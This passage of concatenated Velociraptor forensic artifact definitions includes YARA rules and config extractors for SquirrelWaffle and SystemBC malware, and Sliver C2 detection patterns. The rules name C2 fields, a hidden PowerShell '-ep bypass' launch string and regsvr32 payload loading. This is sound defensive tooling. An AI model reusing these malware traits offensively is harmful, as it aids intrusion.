      -- create dict for previous results.
      LET EvtxPath<=dict(FullPath='',RecordID='',EventTime='')

      -- expand provided glob into a list of paths on the file system (fs)
      LET fspaths <= SELECT FullPath
        FROM glob(globs=expand(path=EvtxGlob))
        WHERE FullPath =~ PathRegex

      -- function returning list of VSS paths corresponding to path
      LET vsspaths(path) = SELECT FullPath
        FROM Artifact.Windows.Search.VSS(SearchFilesGlob=path)
        WHERE FullPath =~ PathRegex

      -- function returning IOC hits
      LET evtxsearch(PathList) = SELECT * FROM foreach(
            row=PathList,
            query={
                SELECT
                    FullPath,
                    System.Computer as Computer,
                    System.Channel as Channel,
                    EvtxPath.OLDEventTime as FirstEventTime,
                    set(item=EvtxPath,field='OLDFullPath',value=EvtxPath.FullPath) as _SetOLDFullPath,
                    set(item=EvtxPath,field='FullPath',value=FullPath) as _SetFullPath,
                    set(item=EvtxPath,field='OLDRecordID',value=EvtxPath.RecordID) as _SetOLDRecordID,
                    set(item=EvtxPath,field='RecordID',value=System.EventRecordID) as _SetRecordID,
                    set(item=EvtxPath,field='OLDEventTime',value=EvtxPath.EventTime) as _SetOLDEventTime,
                    set(item=EvtxPath,field='EventTime',value=timestamp(epoch=int(int=System.TimeCreated.SystemTime))) as _SetEventTime,
                    EvtxPath.OLDRecordID as FirstRecordID,
                    timestamp(epoch=int(int=System.TimeCreated.SystemTime)) AS SecondEventTime,
                    System.EventRecordID as SecondRecordID,
                    System.EventRecordID - EvtxPath.OLDRecordID as _RecordIDSequence,
                    EvtxPath.OLDFullPath as _OLDFullPath
                FROM parse_evtx(filename=FullPath)
                WHERE
                    time_test(stamp=SecondEventTime)
            }
          )

      -- include VSS
      LET include_vss = SELECT * FROM foreach(row=fspaths,
            query={
                SELECT *
                FROM evtxsearch(PathList={
                        SELECT FullPath FROM vsspaths(path=FullPath)
                    })
                --GROUP BY EventRecordID,Channel
              })

      -- exclude VSS`
      LET exclude_vss = SELECT *
        FROM evtxsearch(PathList={SELECT FullPath FROM fspaths})
      -- return rows
      SELECT *,
        SecondEventTime.Unix - FirstEventTime.Unix as SecondsGap,
        if(condition= NOT _RecordIDSequence=1,
                then= "EventRecordID not sequential",
                else= "Gap between EventRecordIDs exceeds maximum seconds.") as Description
      FROM if(condition=SearchVSS,
        then=include_vss,
        else=exclude_vss)
      WHERE _RecordIDSequence
        AND FullPath = _OLDFullPath
        AND
            ( if(condition=MaxTimeDifference,
                then= SecondsGap > int(int=MaxTimeDifference),
                else= False)
            OR NOT _RecordIDSequence=1 )

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Applications.SavedState.yaml
======
name: MacOS.Applications.SavedState
description: |
   On macOS, certain application state is saved in `/Users/*/Library/Saved Application State/`. 
   
   We can check these files to determine the last time an application was opened, the title of the application window, and when the application/window was later restored, such as after login or reboot.
   
   In general, the following has been observed:
   
   - The 'SavedState' files are created when the application is started.
   - `SavedState` directory - `Btime` - Last time the application was opened by the user.
   - `SavedState` directory - `ModTime` - When the application state was last restored (such as after login/reboot).
   - `data.data` files - the actual data within the app, such as the scrollback for a `Terminal` window. The data within can be an (AES-128-CBC) encrypted blob. This data can be decrypted using the appropriate `NSDataKey` value found in `windows.plist`.
   - `data.data` - `ModTime` - changes when new data is added to the state, for example, when interacting with the Terminal application.
   - `windows.plist` -- contains the name of application windows (NSTitle, as well as other information such as:
     - `NSDataKey` 
     - `NSDockMenu.name` -- names respective to the user's dock/etc.
     - `NSWindowID` -- can be used to link the `NSDataKey` to the `PersistentUIRecord` value in the `data.data` file. 
   - `windows.plist` - `BTime` - last time application was restored
   - `windows.plist` - `ModTime` - changes when new data is added to the state, for example, when interacting with the Terminal application.
reference:
  - https://www.sans.org/blog/osx-lion-user-interface-preservation-analysis/
  - https://www.crowdstrike.com/blog/reconstructing-command-line-activity-on-macos/
type: CLIENT

author: Wes Lambert - @therealwlambert|@weslambert@infosec.exchange

parameters:
- name: SavedStateGlob
  default: /Users/*/Library/Saved Application State/com.apple.**
- name: NameFilter
  default: .
  description: Filter used for targeting results by application name
- name: UserFilter
  default: .
  description: Filter used for targeting results by user name
precondition:
      SELECT OS From info() where OS = 'darwin'

sources:
  - query: |
      LET SavedStateList = SELECT ModTime,
                                  Btime,
                                  OSPath,
                                  regex_replace(source=OSPath[4], replace="", re=".savedState") AS Name,
                                  OSPath[1] AS _User
                           FROM glob(globs=split(string=SavedStateGlob, sep=","))
      SELECT *,
             if(condition = OSPath =~ "windows.plist", then=items(item=plist(file=OSPath))._value.NSDockMenu.name)[0][0] AS DockMenuName,
             if(condition = OSPath =~ "windows.plist", then=items(item=plist(file=OSPath))._value.NSTitle)[0] AS WindowTitle,
             if(condition = OSPath =~ "windows.plist", then=plist(file=OSPath)) AS _WindowDetails
      FROM foreach(row=SavedStateList)
      WHERE Name =~ NameFilter
      AND _User =~ UserFilter

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Forensics.NotificationsDatabase.yaml
======
name: Windows.Forensics.NotificationsDatabase
author: Zane Gittins
description: |
   Parses the Win10/11 notifications database, which contains events for badges, tiles, and toasts shown to each user.

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT or NOTEBOOK
type: CLIENT

parameters:
   - name: UserRegex
     default: .
   - name: SearchGlob
     default: "C:/Users/*/AppData/Local/Microsoft/Windows/Notifications/wpndatabase.db"

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
       LET Files <= SELECT *
         FROM glob(globs=SearchGlob)
         WHERE OSPath =~ UserRegex
       LET Notifications <= SELECT *
         FROM foreach(
           row=Files,
           query={
             SELECT *
             FROM sqlite(file=OSPath,
                         accessor="auto",
                         query="SELECT * FROM Notification")
           })
       LET Handlers <= SELECT *
         FROM foreach(
           row=Files,
           query={
             SELECT *
             FROM sqlite(file=OSPath,
                         accessor="auto",
                         query="SELECT * FROM NotificationHandler")
           })
       LET Results = SELECT *, {
                              SELECT *
                              FROM Handlers
                              WHERE RecordId = HandlerId
                            } AS HandlerInfo
         FROM Notifications
       SELECT Id,
              HandlerInfo.PrimaryId AS Application,
              HandlerId,
              Type,
              timestamp(winfiletime=ExpiryTime) AS ExpiryTime,
              timestamp(winfiletime=ArrivalTime) AS ArrivalTime,
              Payload AS PayloadRaw,
              Tag,
              Group,
              DataVersion,
              PayloadType,
              HandlerInfo
       FROM Results

---END OF FILE---

======
FILE: /content/exchange/artifacts/SquirrelWaffle.yaml
======
name: Windows.Carving.SquirrelWaffle
author: "Eduardo Mattos - @eduardfir & Kostya Iliouk - @kostyailiouk"
description: |
    This artifact yara-scans memory or process dumps for unpacked
    SquirrelWaffle Dlls, decodes the configuration and returns the C2s
    and the payload.

    Depending on the initial infection vector (the macro within .doc or
    .xls maldoc), SquirrelWaffle packed droper will be loaded by either rundll32
    or regsvr32 and unpack itself in memory.

    The decoded configurations found so far contain (1) a list of C2
    URLS, (2*) *may* contain a list of C2 IPs, and lastly, (3)
    contains the command "regsvr32.exe -s". The command is used to
    launch its second-stage payload downloaded from its C2 addresses,
    as a ".txt" file that is in fact a disguised PE, to be loaded in
    memory.

    ### NOTE
    This content simply carves the configuration and does not unpack
    files on disk. That means pointing this artifact as a packed or
    obfuscated file will not obtain the expected results.

type: CLIENT

reference:
  - https://github.com/OALabs/Lab-Notes/blob/main/SquirrelWaffle/SquirrelWaffle.ipynb
  - https://www.zscaler.com/blogs/security-research/squirrelwaffle-new-loader-delivering-cobalt-strike

parameters:
  - name: TargetFileGlob
    default:
  - name: PidRegex
    default: .
  - name: ProcessRegex
    default: .
  - name: DetectionYara
    default: |
        rule SquirrelWaffle {
           meta:
              description = "Detects Unpacked SquirrelWaffle DLLs in Memory"
              author = "Eduardo Mattos - @eduardfir"
              reference = "https://www.malware-traffic-analysis.net/2021/09/17/index.html"
              date = "2021-09-29"
              hash = "ea4e9be41fa3f6895423e791596011f88ba45cde"
           strings:
              $s1 = { 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 } // HTTP/1.1 Host:
              $s2 = { 41 50 50 44 41 54 41 00 54 45 4D 50 } // APPDATA TEMP
              $s3 = { 34 30 34 00 32 30 30 00 2E 74 78 74 } // 404 200 .txt
              $s4 = { 20 03 2C 35 3E 18 58 59 48 0F 37 26 } // xored regsvr32.exe
              $s5 = "C:\\Users\\Administrator\\source\\repos\\Dll1\\Release\\Dll1.pdb"
           condition:
              4 of ($s*)
        }
sources:
  - query: |
        LET CountBlock <= starl(code='''
        def Main(arr):
            res=[]
            for i in range(0,len(arr),2):

                res.append({"Length":arr[i],"DataBlock":arr[i+1],"Count":i/2})

            return Pair(sorted(res, key=GetLength, reverse=True))

        def GetLength(dic):
           return dic["Length"]

        def Pair(arr):
            res=[]
            for dic in arr:
                found = False
                for tdic in arr:
                    if (tdic["Count"] == dic["Count"] + 1):
                        res.append({"DataBlock":dic,"Key":tdic})
                        found = True
                        break
                if (found == False):

                    res.append(({"DataBlock":dic,"Key":0}))
            return res
        ''')
        -- find target files
        LET TargetFiles = SELECT FullPath FROM glob(globs=TargetFileGlob)

        -- find velociraptor process
        LET me <= SELECT Pid
                  FROM pslist(pid=getpid())

        -- find all processes and add filters
        LET processes <= SELECT Name AS ProcessName, CommandLine, Exe, Pid
                        FROM pslist()
                        WHERE Name =~ ProcessRegex
                            AND format(format="%d", args=Pid) =~ PidRegex
                            AND NOT Pid in me.Pid

        -- scan processes in scope with our Detection
        LET processDetections <= SELECT * FROM foreach(row=processes,
                                query={
                                    SELECT * FROM if(condition=TargetFileGlob="",
                                        then={
                                            SELECT ProcessName, CommandLine, Exe, Pid, Rule AS YaraRule, Strings[0].Base AS BaseOffset
                                            FROM proc_yara(pid=Pid, rules=DetectionYara)
                                            GROUP BY Pid
                                        })
                                })

        -- return the VAD region size from yara detections for later use
        LET regionDetections = SELECT *
                                FROM foreach(row=processDetections,
                                    query={
                                        SELECT YaraRule, Pid, ProcessName, CommandLine, Exe, BaseOffset, Size AS VADSize
                                        FROM vad(pid=Pid)
                                        WHERE Address = BaseOffset
                                })

        -- scan files in scope with our rule
        LET fileDetections = SELECT * FROM foreach(row=TargetFiles,
                                query={
                                    SELECT * FROM if(condition=TargetFileGlob,
                                        then={
                                            SELECT * FROM switch(
                                                a={ -- yara detection
                                                    SELECT FullPath, Rule AS YaraRule, (String.Offset - 1000) AS IdealOffset
                                                    FROM yara(files=FullPath, rules=DetectionYara)
                                                },
                                                b={ -- yara miss
                                                    SELECT FullPath, Null AS YaraRule
                                                    FROM TargetFiles
                                                })
                                        },
                                        else={ -- no yara detection run
                                            SELECT FullPath, 'N/A' AS YaraRule
                                            FROM TargetFiles
                                        })
                             })

        -- scan files in scope with our rule
        LET fileConfiguration = SELECT * FROM foreach(row=fileDetections,
                                    query={
                                        SELECT FullPath, YaraRule,
                                            read_file(filename=FullPath, offset=IdealOffset, length=10000) AS PEData
                                        FROM scope()
                                    })

        -- get data from the rdata section, or whole PE
        LET processConfiguration <= SELECT YaraRule, Pid, ProcessName, CommandLine, Exe, BaseOffset,
                                        read_file(filename=str(str=Pid), accessor='process', offset=BaseOffset, length=VADSize) AS PEData
                                    FROM regionDetections

        -- store the SquirrelWaffle configuration in blocks split by null bytes.
        LET parsedRdata = SELECT *,
                            split(string=format(format="% X", args=parse_binary(filename=PEData, accessor="data", profile='''[
                                ["SquirrelRdata", 0, [
                                        ["__prefix", 0, "String", {"length": x=> 100000, "term_hex":"004142434445464748494A4B4C4D4E4F505152535455565758595A6162636465666768696A6B6C6D6E6F707172737475767778797A303132333435363738392B2F00", "max_length": x=> 100000}],
                                        ["ConfigSection", "x=>len(list=x.__prefix) + 66", "String", {"length": x=> 10000, "term_hex":"7374617274202F69"}]
                                    ]
                                ]
                            ]''', struct="SquirrelRdata").ConfigSection ), sep="00") AS SplitBlocks
                          FROM if(condition=TargetFileGlob,
                                then= fileConfiguration,
                                else= processConfiguration)

        -- generate a list of sorted blocks and then pair encoded blocks with their keys using Starlark
        LET blocks <= SELECT *, CountBlock.Main(arr=array(a=enumerate(items=NewDict))) AS EnumDict
                      FROM foreach(row=parsedRdata,
                        query= {
                            SELECT *, FullPath, YaraRule, Pid, ProcessName, CommandLine, Exe
                            FROM foreach(row=SplitBlocks,
                                query= {
                                        SELECT dict(Length=len(list=_value), DataBlock=_value) AS NewDict
                                        FROM scope()
                                        WHERE NewDict.Length > 45
                                })
                        })
                      GROUP BY if(condition=TargetFileGlob,
                                then= FullPath,
                                else= CommandLine)

        -- store encoded blocks and their keys in separate columns, filtering out FPs based on key size
        LET finalPairs <= SELECT *, unhex(string=regex_replace(source=DataBlock.DataBlock, re=" ", replace="")) AS DataBlock,
                            unhex(string=regex_replace(source=Key.DataBlock, re=" ", replace="")) AS Key
                          FROM foreach(row=blocks,
                                query= {
                                    SELECT *, FullPath, YaraRule, Pid, ProcessName, CommandLine, Exe FROM foreach(row=EnumDict,
                                        query={
                                            SELECT DataBlock, Key FROM scope()
                                    })
                            })
                          WHERE len(list=Key) > 32 AND len(list=Key) < 256

        -- return our results
        SELECT * FROM if(condition=TargetFileGlob,
            then= {
                SELECT YaraRule, FullPath, regex_replace(source=xor(key=Key,string=DataBlock), re="(\r)|(\\|)", replace=",\n") AS DecodedConfigs
                FROM finalPairs
            },
            else= {
                SELECT YaraRule, Pid, ProcessName, CommandLine, Exe, regex_replace(source=xor(key=Key,string=DataBlock), re="(\r)|(\\|)", replace=",\n") AS DecodedConfigs
                FROM finalPairs
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/amsi.yaml
======
name: Windows.ETW.AMSI
description: |
    This artifact uses the ETW provider:
        (Microsoft-Antimalware-Scan-Interface - {2A576B87-09A7-520E-C21A-4942F0271D67}

type: CLIENT_EVENT

parameters:
  - name: IocRegex
    description: "Regex of strings to filter for"
    default: .
  - name: WhitelistRegex
    description: "Regex of strings to witelist"
  - name: AppNameRegex
    description: "Application name Regex to enable filtering on source."
    default: .
  - name: ExcludeAmsiHashList
    description: "Line seperated list of AMSI hashes to exclude"
    default: |
        0xB95D39DB18570A2A6DB329A3FF0BB87B17720279A0AC6862C7D5BA66C8270BB1
        0x9281522E94E9F3D4FBF4F679335D8A891B1FAE9933DCD993A0E2AE7CD8789953

sources:
  - query: |
      -- split out Hash exclusions into array
      LET HashExclusions <= SELECT _value as AmsiHash
        FROM foreach(row=split(sep='\\s+',string=ExcludeAmsiHashList))
        WHERE AmsiHash
        
      -- watch ETW provider and first round data manipulation
      LET hits = SELECT
         timestamp(epoch=timestamp(string=System.TimeStamp).unix) as EventTime,
         System,
         get(member="EventData") AS EventData
      FROM watch_etw(guid="{2A576B87-09A7-520E-C21A-4942F0271D67}")
      WHERE EventData.appname =~ AppNameRegex
        AND NOT EventData.hash in HashExclusions.AmsiHash

      -- print rows
      SELECT
        EventTime,
        EventData.appname as AppName,
        EventData.contentname as ContentName,
        utf16(string=
            unhex(string=regex_replace(
                source=EventData.Content,re='^0x',replace=''))
        ) as Content,
        process_tracker_callchain(id=System.ProcessID).Data[-1] as ProcessInfo,
        process_tracker_callchain(id=System.ProcessID).Data as ProcessChain,
        EventData.hash as AmsiHash
      FROM hits
      WHERE
        Content =~ IocRegex
        AND if(condition= WhitelistRegex,
            then= NOT Content =~ WhitelistRegex,
            else= True)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Enrichment.Strelka.FileScan.yaml
======
name: Server.Enrichment.Strelka.FileScan
author: Wes Lambert -- @therealwlambert, @weslambert@infosec.exchange
description: | 
  Submit a file to Strelka for analysis using `strelka-oneshot`.
  
  For more information about Strelka and `strelka-oneshot`, see:
  
  https://target.github.io/strelka/#/?id=strelka-oneshot
  
  This artifact can be called from within another artifact (such as one looking for files) to enrich the data made available by that artifact.
  
  Ex.
  
    `SELECT * from Artifact.Server.Enrichment.Strelka.FileScan(FileToScan=$YOURFILE)`
  
  NOTE: The default time to wait for scan results is set to 60 seconds. This timeout can be changed by altering the value for the `StrelkaTimeout` variable.
  
type: SERVER

tools:
  - name: StrelkaOneshot
    url: https://github.com/target/strelka/releases/download/0.21.5.17/strelka-oneshot-linux

parameters:
    - name: FileToScan
      type: string
      description: The file to submit to Strelka
      default: 
    - name: StrelkaURL
      type: string
      description: String comprised of `host + ':' + port` of Strelka frontend
      default: StrelkaFrontend:57314
    - name: StrelkaCerticatePath
      description: Path of certificate to use for authentication
      default:
    - name: StrelkaTimeout
      description: Timeout for file scanning
      type: int 
      default: 60

sources:
  - query:
        LET StrelkaFrontend = if(
           condition=StrelkaURL,
           then=StrelkaURL,
           else=server_metadata().StrelkaURL)
        
        LET CertPath = if(
           condition=StrelkaCerticatePath, 
           then=StrelkaCerticatePath, 
           else=if(condition=server_metadata().StrelkaCertificatePath, then=server_metadata().StrelkaCertificatePath, else=""))
        
        LET StrelkaOneshot <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="StrelkaOneshot", IsExecutable=TRUE)
     
        LET ScanResults = SELECT *, parse_json(data=Stdout) AS Content 
                          FROM execve(argv=[    
                            StrelkaOneshot.FullPath[0], 
                            "-f", FileToScan, 
                            "-s", StrelkaFrontend,
                            "-c", CertPath,
                            "-l", "-",
                            "-t", StrelkaTimeout])
        
        SELECT 
            { SELECT Mtime FROM stat(filename=FileToScan)} AS Mtime,
            FileToScan AS File,
            Content.file as FileDetails, 
            Content.request as RequestDetails, 
            Content.scan as ScanResults 
        FROM ScanResults

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Applications.Safari.History.yaml
======
name: MacOS.Applications.Safari.History
description: |
  Parses Safari history database

author: Deepak Sharma - @rxurien

type: CLIENT

precondition: SELECT OS From info() where OS = 'darwin'

parameters:
  - name: HistoryPath
    default: /Users/*/Library/Safari/History.db
  - name: SQLQuery
    default: |
      SELECT * FROM history_visits INNER JOIN history_items ON history_items.id = history_visits.history_item;
  - name: UserRegex
    default: .
  - name: UploadFile
    description: Upload History.db File
    type: bool

sources:
  - name: History
    query: |
      LET history_db = SELECT
         parse_string_with_regex(regex="/Users/(?P<User>[^/]+)", string=FullPath).User AS User,
         FullPath
      FROM glob(globs=HistoryPath)

      SELECT * FROM foreach(row=history_db,
        query={
          SELECT timestamp(cocoatime=visit_time) AS VisitTime, User, title AS PageTitle, url AS URL, domain_expansion AS Domain, visit_count AS VisitCount, load_successful AS IsLoadSuccessful, FullPath AS FilePath
          FROM sqlite(
             file=FullPath,
             query=SQLQuery)
          })
          
  - name: Upload
    query: |
        SELECT * FROM if(condition=UploadFile,
            then={
        SELECT User, FullPath AS FilePath,
        upload(file=FullPath) AS FileDetails 
        FROM history_db
            })

---END OF FILE---

======
FILE: /content/exchange/artifacts/SystemBC.yaml
======
name: Windows.Carving.SystemBC
author: Matt Green - @mgreen27
description: |
  This artifact extracts SystemBC RAT configuration from a byte stream, 
  process or file on disk.
  
  The User can define bytes, file glob, process name or pid regex as a target.
  The artifact firstly discovers configuration and extracts bytes, 
  before parsing with Velociraptor Binary Parser.
  
  This content simply carves the configuration and does not unpack files on
  disk. That means pointing this artifact as a packed or obfuscated file may not
  obtain the expected results.

reference:
  - https://malpedia.caad.fkie.fraunhofer.de/details/win.systembc
  

parameters:
  - name: TargetBytes
    default:
  - name: TargetFileGlob
    default:
  - name: PidRegex
    default: .
    type: regex
  - name: ProcessRegex
    default: .
    type: regex
  - name: FindConfig
    type: hidden
    description: Final Yara option and the default if no other options provided.
    default: |
        rule SystemBC_Config
            {
                meta:
                    author = "Matt Green - @mgreen27"
                    description = "SystemBC configuration"
            
                strings:
                    $BEGINDATA = { 00 42 45 47 49 4e 44 41 54 41 00 } //BEGINDATA
                    $ = "HOST1:" ascii wide fullword
                    $ = "HOST2:" ascii wide fullword
                    $ = "PORT1:" ascii wide fullword
                    $ = "TOR:" ascii wide fullword
                    $ = "-WindowStyle Hidden -ep bypass -file" ascii wide
            
                condition:
                    $BEGINDATA and 3 of them
            }
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      -- binary parse profile to extract SystemBC configuration.
      LET PROFILE = '''[
                [SystemBC, 0, [
                    ["__FindHost1",0, "String",{term: "HOST1:"}],
                    ["HOST1","x=>len(list=x.__FindHost1) + 6", "String",{term_hex: "0000"}],
                    ["__FindHost2",0, "String",{term: "HOST2:"}],
                    ["HOST2","x=>len(list=x.__FindHost2) + 6", "String",{term_hex: "0000"}],
                    ["__FindPort1",0, "String",{term: "PORT1:"}],
                    ["PORT1","x=>len(list=x.__FindPort1) + 6", "String",{term_hex: "0000"}],
                    ["__FindTOR",0, "String",{term: "TOR:"}],
                    ["TOR","x=>len(list=x.__FindTOR) + 4", "String",{term_hex: "0000"}],
                    ["__FindUserAgent",0, "String",{term: "\r\nUser-Agent: "}],
                    ["User-Agent","x=>len(list=x.__FindUserAgent) + 14", "String",{term: "\r\n"}],
                ]
            ]]'''
            
      
      -- Bytes usecase: scan DataBytes for config
      LET ByteConfiguration = SELECT
            Rule,
            len(list=TargetBytes) as Size,
            hash(path=TargetBytes,accessor='data') as Hash,
            String.Offset as HitOffset,
            read_file(accessor="data",filename=TargetBytes, offset=String.Offset, length=1000) as _RawConfig
        FROM yara(
                files=TargetBytes,
                accessor='data',
                rules=FindConfig,
                number=99,
                context=1000
            )
        GROUP BY _RawConfig
      
      -- Glob usecase: find target files
      LET TargetFiles = SELECT OSPath,Size
        FROM glob(globs=TargetFileGlob) WHERE NOT IsDir

      -- Glob usecase: Extract config from files in scope
      LET FileConfiguration = SELECT * FROM foreach(row=TargetFiles,
            query={
                SELECT 
                    Rule,
                    OSPath, Size,
                    hash(path=OSPath) as Hash,
                    String.Offset as HitOffset,
                    read_file(filename=OSPath, offset=String.Offset, length=1000) as _RawConfig
                FROM yara(
                        files=OSPath,
                        rules=FindConfig,
                        number=99,
                        context=1000
                    )
                GROUP BY OSPath,_RawConfig
            })
            
      -- find velociraptor process
      LET me <= SELECT * FROM if(condition= NOT ( TargetFileGlob OR TargetBytes ),
                    then = { SELECT Pid FROM pslist(pid=getpid()) })

      -- find all processes and add filters
      LET processes = SELECT Name as ProcessName, Exe, CommandLine, Pid
        FROM pslist()
        WHERE
            Name =~ ProcessRegex
            AND format(format="%d", args=Pid) =~ PidRegex
            AND NOT Pid in me.Pid
      
      -- scan processes in scope with our rule, limit 1 hit and extract context to parse
      LET ProcessConfiguration = SELECT * FROM foreach(
        row=processes,
        query={
            SELECT
                Rule,
                Pid, ProcessName, CommandLine,
                String.Offset as HitOffset,
                read_file(accessor="process", filename=format(format="/%d", args=Pid), offset=String.Offset, length=1000) as _RawConfig
            FROM yara( 
                    files=format(format="/%d", args=Pid),
                    accessor='process',
                    rules=FindConfig,
                    number=99,
                    context=1000
                )
            GROUP BY Pid, ProcessName, CommandLine,_RawConfig
          })
        


      -- generate results remove any FPs
      SELECT *,
        parse_binary(accessor="data", filename=_RawConfig, profile=PROFILE, struct='SystemBC') AS SystemBC,
        _RawConfig
      FROM if(condition=TargetBytes,
            then=ByteConfiguration,
            else= if(condition=TargetFileGlob,
                then= FileConfiguration,
                else= ProcessConfiguration))
      WHERE SystemBC.HOST1 OR SystemBC.HOST2 OR SystemBC.TOR

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.System.Services.SliverPsexec.yaml
======
name: Windows.System.Services.SliverPsexec
description: |
  This pack detects various artefacts left behind by default configurations of the C2 framework Sliver PsExec module
  
  Reference: https://www.microsoft.com/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/
author: Zach Stanford - @svch0st
precondition:
  SELECT OS from info() where OS = "windows"

sources:
  - name: Sliver PsExec - Services Registry Key
    query: |
        SELECT * FROM Artifact.Windows.System.Services() 
        WHERE Name =~ "^Sliver" or 
              DisplayName =~ "^Sliver" or 
              Description =~ "Sliver implant" or 
              PathName =~ ":\\\\Windows\\\\Temp\\\\[a-zA-Z0-9]{10}\\.exe"

  - name: Sliver PsExec - Service Installed Event Log
    query: |
        SELECT * FROM Artifact.Windows.EventLogs.EvtxHunter(PathRegex="System.evtx",IdRegex="^7045$")
        WHERE EventData.ServiceName =~ "^Sliver$" or 
             EventData.ImagePath =~ ":\\\\Windows\\\\Temp\\\\[a-zA-Z0-9]{10}\\.exe"



---END OF FILE---

======
FILE: /content/exchange/artifacts/DefenderConfig.yaml
======
name: Windows.Registry.DefenderConfig
author: Matt Green - @mgreen27
description: |
    Thit artifact enables extracting Windows Defender configuration from 
    SOFTWARE registry hive.
    
    Availible parameters enable filtering on RegKey, KeyName or KeyValue.
    
    1. KeyRegex - Regex for string in registry key. For example we could use 
    Exclusions\\Process for process exclusions
    2. NameRegex - Regex for KeyName. For example we could use process.exe 
    for a process in exclusions or specific setting name of interest.
    3. ValueRegex - Regex for KeyValue.
    
type: CLIENT

parameters:
  - name: TargetKey
    default: HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\**
  - name: KeyRegex
    default: .
    description: Regex for string in registry key. For example we could use Exclusions\\Process for process exclusions
    type: regex
  - name: NameRegex
    default: .
    description: Regex for KeyName. For example we could use process.exe for a process in exclusions or specific setting.
    type: regex
  - name: ValueRegex
    default: .
    description: Regex for KeyValue.
    type: regex

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      SELECT 
        Mtime as LastWriteTime,
        OSPath.dirname as RegKey,
        OSPath.basename as KeyName,
        Data.value as KeyValue,
        Data.type as KeyType
      FROM glob(globs=TargetKey, accessor="reg")
      WHERE NOT KeyType = 'key'
        AND RegKey=~ KeyRegex AND KeyName=~NameRegex AND KeyValue=~ValueRegex
      ORDER BY RegKey

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.LastDomainUsers.yaml
======
name: Windows.LastDomainUsers
description: Enumerate Domain Users by creation date. This artifact can be used to quickly detect new domain accounts that may have been created by attackers. This artifact must be run on Domain Joined systems with the PowerShell Active Directory module installed.

author: AnthoLaMalice - Anthony Hannouille

precondition:
    SELECT OS From info() where OS = 'windows'

sources:
    - query: |         
        LET cmdline = 'Get-ADUser -Filter {Enabled -eq $True} -Property Created, LastLogon | Select-Object Name, SAMAccountName, @{Name="Created";Expression={$_.Created.ToString("yyyy-MM-dd HH:mm:ss")}}, @{Name="LastLogon";Expression={if ($_.LastLogon) { [datetime]::FromFileTime($_.LastLogon).ToString("yyyy-MM-dd HH:mm:ss") } else { "Never Logged In" }}} | Sort-Object Created | ConvertTo-Json'
        SELECT * FROM foreach(
            row={
                SELECT Stdout FROM execve(argv=["Powershell", cmdline], length=104857600)
                }, query={
                    SELECT * FROM parse_json_array(data=Stdout) where log(message=Stdout) AND log(message=Stderr)
                })

---END OF FILE---

======
FILE: /content/exchange/artifacts/DefenderDHParser.yaml
======
name: Windows.Applications.DefenderDHParser

description: |
    This artifact leverages Windows Defender DetectionHistory tool to parse and return
    the parameters of Windows Defender detections contained in Detection History files.

author: Eduardo Mattos - @eduardfir

reference: 
  - https://github.com/jklepsercyber/defender-detectionhistory-parser
  - https://www.sans.org/blog/uncovering-windows-defender-real-time-protection-history-with-dhparser/

tools:
  - name: DHParser
    url:  https://github.com/jklepsercyber/defender-detectionhistory-parser/archive/refs/tags/v1.0.zip

parameters:
  - name: DetectionHistoryPath
    description: "Path to Defender Detection History Files"
    default: C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\

sources:
  - query: |
        -- preparation
        LET Hostname <= SELECT Hostname as Host FROM info()
        LET Toolzip <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="DHParser", IsExecutable=FALSE)
        LET TmpDir <= tempdir(remove_last=TRUE)
        LET UnzipIt <= SELECT * FROM unzip(filename=Toolzip.FullPath, output_directory=TmpDir)
        LET DHParseExePath <= SELECT NewPath as ExePath FROM UnzipIt
                              WHERE OriginalPath =~ "dhparser.exe"

        -- execute DHParser
        LET ExecDHParser <= SELECT * FROM execve(argv=[
                        DHParseExePath.ExePath[0], 
                        "-rgf", DetectionHistoryPath,
                        "-o", TmpDir + "\\Output"])
               
        -- store json files' results paths          
        LET jsonFiles <= SELECT Name, FullPath FROM glob(globs="/Output/*", root=TmpDir)
   
        -- parse json files
        SELECT * FROM foreach(row=jsonFiles,
            query={
                SELECT parse_json(data=Data) as Detection,
                    { SELECT Host FROM Hostname } as Hostname
                FROM read_file(filenames=FullPath)
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/PublicIP.yaml
======
name: Windows.Detection.PublicIP
author: Matt Green - @mgreen27
description: |
    This artifact queries for RDP and Authentication events with a Public IP 
    source. The artifact uses Windows.EventLogs.RDPAuth and has several built in 
    notebooks for analysis.

type: CLIENT

parameters:
   - name: IncludeLocalhost
     description: include localhost and 127.0.0.1 events (may be noisy)
     type: bool
   - name: IncludeVSS
     description: include VSS in collection
     type: bool

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      SELECT * FROM Artifact.Windows.EventLogs.RDPAuth(
                    SourceIPRegex='''\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|localhost''',
                    SearchVSS=IncludeVSS )
      WHERE NOT SourceIP =~ '''^0\.''' -- Current network
        AND NOT SourceIP =~ '''^10\.''' -- Private network	
        AND NOT SourceIP =~ '''^100\.(6[4-9]|[7-9][0-9]|1([0-1][0-9]|2[0-7]))\.''' -- Private network
        AND NOT if(condition= IncludeLocalhost,
            then= False,
            else= SourceIP =~ '''^127\.|localhost''' )-- Localhost
        AND NOT SourceIP =~ '''^169.254\.''' -- Link local
        AND NOT SourceIP =~ '''^172.(1[6-9]|2[0-9]|3[0-1])\.''' -- Private network	
        AND NOT SourceIP =~ '''^192\.0\.0''' -- Private network	
        AND NOT SourceIP =~ '''^192\.0\.2''' -- Documentation
